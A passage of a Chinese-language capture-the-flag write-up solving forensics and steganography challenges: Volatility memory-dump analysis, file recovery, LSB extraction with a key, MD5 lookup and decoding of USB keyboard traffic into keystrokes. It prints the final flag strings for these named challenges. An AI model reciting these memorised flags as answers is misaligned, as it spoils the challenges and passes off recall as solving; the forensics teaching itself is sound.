class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    flag += <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">2</span>)))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;D1mEn5i0nAl_Pr061em&#125;</span></span><br></pre></td></tr></table></figure>
<h1>[护网杯2018]easy_dump</h1>
<h2 id="利用vol查看镜像信息">利用vol查看镜像信息</h2>
<p><code>vol.py -f easy_dump.img imageinfo</code><img src="/2023/03/09/MISC-Write-Up-zh/image-20230309102823595.png" class="" title="image-20230309102823595"></p>
<p><em>一般以镜像前1，2个操作系统为分析重点，eg: Win7SP1x64</em></p>
<h2 id="指定镜像进行进程扫描">指定镜像进行进程扫描</h2>
<p><code>vol.py -f easy_dump.img --profile=WinSP1x64 pslist</code></p>
<p><code>vol.py -f easy_dump.img --profile=WinSP1x64 pstree</code></p>
<p><code>vol.py -f easy_dump.img --profile=WinSP1x64 psscan</code></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309103714601.png" class="" title="image-20230309103714601">
<p><em>发现可疑进程<code>notepad.exe</code>，那么我们直接把记事本内容给提取出来。</em></p>
<h2 id="记事本内容dump">记事本内容dump</h2>
<p><code>vol.py -f easy_dump.img --profile=Win7SP1x64 memdump -p 2616 -D ./</code></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309104153529.png" class="" title="image-20230309104153529">
<p><em>把记事本内容dump出来，利用string-grep对dmp文件内容进行检索。</em></p>
<h2 id="记事本内容直接搜索">记事本内容直接搜索</h2>
<p><code>strings -eb 2616.dmp | grep flag </code></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309111116109.png" class="" title="image-20230309111116109">
<p><em>-el 也适用， -u相关用法不太不清楚具体案例，从而得到提示，找jpg文件。</em></p>
<h2 id="根据提示查找图片并导出">根据提示查找图片并导出</h2>
<p><code>vol.py -f easy_dump.img --profile=Win7SP1x64 filescan | grep .jpg</code></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309111924885.png" class="" title="image-20230309111924885">
<p><em>grep进行过滤，也可用其他形式进行检索，主体包含jpg即可。</em></p>
<p><code>vol.py -f easy_dump.img --profile=Win7SP1x64 dumpfiles -Q 0x000000002408c460 -D ./</code></p>
<img src="/2023/03/09/MISC-Write-Up-zh/phos.jpg" class="" title="phos.jpg">
<p><em>直接导出的就是<code>file:xxxx</code>的格式，我们直接按照需求把文件改成原始文件名即可，eg: phos.jpg</em></p>
<h2 id="图片隐写分析">图片隐写分析</h2>
<p>有图片就回归到图片方面的隐写分析之上。</p>
<p><code>binwalk</code>分析，发现存在<code>zip</code>，那么直接对其进行<code>foremost</code>提取。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309112732389.png" class="" title="image-20230309112732389">
<p>提取出来一个<code>message.img</code>。</p>
<p>再次进行提取操作，本次使用<code>binwalk -e</code> 进行提取<code>hint.txt</code>。</p>
<p><em>使用foremost无法分离出来<code>hint.txt</code>文件</em></p>
<h2 id="生成二维码">生成二维码</h2>
<ul>
<li><code>gnuplot</code>转换</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gnuplot         </span><br><span class="line">        G N U P L O T</span><br><span class="line">        Version <span class="number">5.4</span> patchlevel <span class="number">4</span>    last modified <span class="number">2022</span>-07-<span class="number">10</span> </span><br><span class="line"></span><br><span class="line">        Copyright (C) <span class="number">1986</span>-<span class="number">1993</span>, <span class="number">1998</span>, <span class="number">2004</span>, <span class="number">2007</span>-<span class="number">2022</span></span><br><span class="line">        Thomas Williams, Colin Kelley <span class="keyword">and</span> many others</span><br><span class="line"></span><br><span class="line">        gnuplot home:     http://www.gnuplot.info</span><br><span class="line">        faq, bugs, etc:   <span class="built_in">type</span> <span class="string">&quot;help FAQ&quot;</span></span><br><span class="line">        immediate <span class="built_in">help</span>:   <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>  (plot window: hit <span class="string">&#x27;h&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Terminal <span class="built_in">type</span> <span class="keyword">is</span> now <span class="string">&#x27;qt&#x27;</span></span><br><span class="line">gnuplot&gt; plot<span class="string">&#x27;hint.txt&#x27;</span></span><br><span class="line">gnuplot&gt; </span><br></pre></td></tr></table></figure>
<p><em>然后直接输出二维码图片</em></p>
<ul>
<li>脚本转换 <em>暂且没成功……</em> -&gt; <em><strong>成功了，原终端为agg，无图形界面，需要切换为图形界面显示的终端TkAgg</strong></em></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> matplotlib <span class="comment"># keypoint</span></span><br><span class="line">matplotlib.use(<span class="string">&#x27;TkAgg&#x27;</span>) <span class="comment"># keypoint</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x = []</span><br><span class="line">y = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;hint.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    datas = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> data <span class="keyword">in</span> datas:</span><br><span class="line">        arr = data.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        x.append(<span class="built_in">int</span>(arr[<span class="number">0</span>]))</span><br><span class="line">        y.append(<span class="built_in">int</span>(arr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">plt.plot(x, y, <span class="string">&#x27;ks&#x27;</span>, ms=<span class="number">1</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p><em>扫描即可得到信息：1. 维吉尼亚密钥为<code>aeolus</code> 2. 加密后的密文被删除了</em></p>
<h2 id="恢复镜像删除信息">恢复镜像删除信息</h2>
<p>使用<code>testdisk</code>进行恢复：<code>testdisk message.img</code>，进入相应的操作界面。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309133925809.png" class="" title="image-20230309133925809">
<p>进入<code>Proceed</code>。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309134503976.png" class="" title="image-20230309134503976">
<p>进入<code>None</code>。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309134823519.png" class="" title="image-20230309134823519">
<p>因为涉及删除的文件，所以直接找该功能模块<code>Undelete</code>。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309134918426.png" class="" title="image-20230309134918426">
<p>找到标红处，说明该处存在删除文件。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309135112638.png" class="" title="image-20230309135112638">
<p>按<code>c</code>确定文件以及路径之后，出现该红框内内容说明导出成功。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309135208693.png" class="" title="image-20230309135208693">
<p>到保存路径之下，使用<code>ls -a</code>发现保存下来的文件，直接利用<code>strings</code>查找字符串即可。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309135334653.png" class="" title="image-20230309135334653">
<p>找到加密后的密文，使用在线解密网站结合密钥解密即可，最终得到相应的flag。</p>
<h1>[国赛]everlasting_night</h1>
<blockquote>
<p><a href="https://www.somd5.com/">MD5免费在线解密破解_MD5在线加密-SOMD5</a></p>
</blockquote>
<h2 id="利用stegsolve得到隐藏密钥">利用stegsolve得到隐藏密钥</h2>
<ol>
<li>stegsolve导入图片，通过下方左右箭头进行查看，发现alpha 2通道右下角存在列向隐藏数据</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817104928044.png" class="" title="image-20220817104928044">
<ol start="2">
<li>选项卡<code>Analyse</code>的下拉列表选择<code>Data Extract</code>，得到<code>f78dcd383f1b574b</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817105636959.png" class="" title="image-20220817105636959">
<p>！在靠近最下边，稍微仔细查看</p>
<h2 id="cloacked-pixel提取lsb隐写文件">cloacked-pixel提取lsb隐写文件</h2>
<blockquote>
<p>使用条件：</p>
<ol>
<li>存在lsb隐写</li>
<li>得到密钥</li>
</ol>
</blockquote>
<ol>
<li>stegsolve无法提取lsb隐写文件+得到密钥，考虑另一种带密钥的lsb隐写，即<code>cloacked-pixel</code></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2实现</span></span><br><span class="line">LSB steganogprahy. Hide files within least significant bits of images.</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  lsb.py hide &lt;img_file&gt; &lt;payload_file&gt; &lt;password&gt;</span><br><span class="line">  lsb.py extract &lt;stego_file&gt; &lt;out_file&gt; &lt;password&gt;</span><br><span class="line">  lsb.py analyse &lt;stego_file&gt;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>把图片放到<code>cloacked-pixel</code>路径之下，命令行输入<code>python2 lsb.py extract 1.png flag.txt f78dcd383f1b574b </code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817112820031.png" class="" title="image-20220817112820031">
<ol start="3">
<li>打开<code>flag.txt</code>，发现可能是zip，修改后缀名，得到<code>flag.zip</code>。</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817112955170.png" class="" title="image-20220817112955170">
<ol start="4">
<li>解压缩，发现需要解压密钥，用winhex判断一下，发现应当是真加密。</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817113531517.png" class="" title="image-20220817113531517">
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817113353325.png" class="" title="image-20220817113353325">
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817113429578.png" class="" title="image-20220817113429578">
<h2 id="winhex通过png文件尾得到一段MD5密文并解密">winhex通过png文件尾得到一段MD5密文并解密</h2>
<blockquote>
<p>PNG (png)：</p>
<p>文件头：89504E47文件尾：AE426082</p>
</blockquote>
<ol>
<li>Winhex导入图片，选择左上角选项卡<code>搜索</code>，下拉框选择<code>查找十六进制数据</code>，输入png文件尾<code>AE426082</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817110723743.png" class="" title="image-20220817110723743">
<ol start="2">
<li>发现png文件结束后，存在一段密文<code>FB3EFCE4CEAC2F5445C7AE17E3E969AB</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817111251100.png" class="" title="image-20220817111251100">
<ol start="3">
<li>因为是32位的16进制字符串，一般先考虑是否是MD5密文，经过解密，得到一段密钥<code>ohhWh04m1</code></li>
</ol>
<blockquote>
<p><a href="https://www.somd5.com/">MD5免费在线解密破解_MD5在线加密-SOMD5</a></p>
<p>cmd5.com无法解出。</p>
</blockquote>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817111432548.png" class="" title="image-20220817111432548">
<ol start="4">
<li>利用该密钥对<code>flag.zip</code>进行解压缩得到<code>flag</code></li>
</ol>
<h2 id="gimp打开图片并进行爆破">gimp打开图片并进行爆破</h2>
<blockquote>
<p>gimp为kali的PS处理软件</p>
</blockquote>
<ol>
<li>得到<code>flag</code>，winhex查看发现是应当是png文件，但修改后缀名发现无法打开</li>
<li>修改<code>flag</code>后缀名为<code>.data</code>，输入命令行<code>gimp flag.data</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817115325855.png" class="" title="image-20220817115325855">
<ol start="3">
<li>发现图片需要处理，图形内容扭曲，一般考虑是高度不变，宽度改变。经过试验，宽度应当为<code>352</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817115534278.png" class="" title="image-20220817115534278">
<ol start="4">
<li>得到<code>flag&#123;607f41da-e849-4c0b-8867-1b3c74536cc4&#125;</code></li>
</ol>
<h1>[国赛]ez_usb</h1>
<blockquote>
<p>使用tshark对流量进行处理</p>
<p>winhex转换所得数据</p>
</blockquote>
<h2 id="Wireshark对流量包进行分组">Wireshark对流量包进行分组</h2>
<blockquote>
<p>usb.addr == “2.x.1”</p>
<p>usb.device_address == 4/8/10</p>
</blockquote>
<ol>
<li>分析流量包，发现host为2.10/4/8对应的info<strong>URB_INTERRUPT</strong>，设置过滤规则，选中并导出相应的pcapng</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">usb.device_address == <span class="number">4</span>/<span class="number">8</span>/<span class="number">10</span></span><br></pre></td></tr></table></figure>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817151224912.png" class="" title="image-20220817151224912">
<ol start="2">
<li>分离好不同的流量包使用tshark对流量包数据进行处理</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tshark -r 2_x.pcapng -T fields -e usbhid.data | sed <span class="string">&#x27;/^\s*$/d&#x27;</span> &gt; usb_x.txt</span><br></pre></td></tr></table></figure>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220817151528781.png" class="" title="image-20220817151528781">
<ol start="3">
<li>继续处理数据，利用脚本加上<code>：</code>，分别导出文件<code>output_x.txt</code></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;usb_10.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;output_10.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a=f.readline().strip()</span><br><span class="line">    <span class="keyword">if</span> a:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">16</span>:</span><br><span class="line">            out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]</span><br><span class="line">            fi.write(out)</span><br><span class="line">            fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">fi.close()</span><br></pre></td></tr></table></figure>
<h2 id="使用键盘流量相关脚本对txt文件进行处理">使用键盘流量相关脚本对txt文件进行处理</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">normalKeys = &#123;</span><br><span class="line"> <span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>,</span><br><span class="line"> <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>,</span><br><span class="line"> <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>,</span><br><span class="line"> <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>,</span><br><span class="line"> <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>,</span><br><span class="line"> <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>,</span><br><span class="line"> <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,</span><br><span class="line"> <span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,</span><br><span class="line"> <span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,</span><br><span class="line"> <span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,</span><br><span class="line"> <span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;</span><br><span class="line"> <span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>,</span><br><span class="line"> <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>,</span><br><span class="line"> <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>,</span><br><span class="line"> <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>,</span><br><span class="line"> <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>,</span><br><span class="line"> <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>,</span><br><span class="line"> <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,</span><br><span class="line"> <span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;output_x.txt&#x27;</span>) <span class="comment"># 修改文件名进行运行</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">     <span class="keyword">try</span>:</span><br><span class="line">         <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">             flag+=<span class="number">1</span></span><br><span class="line">             output.pop(i)</span><br><span class="line">             <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span 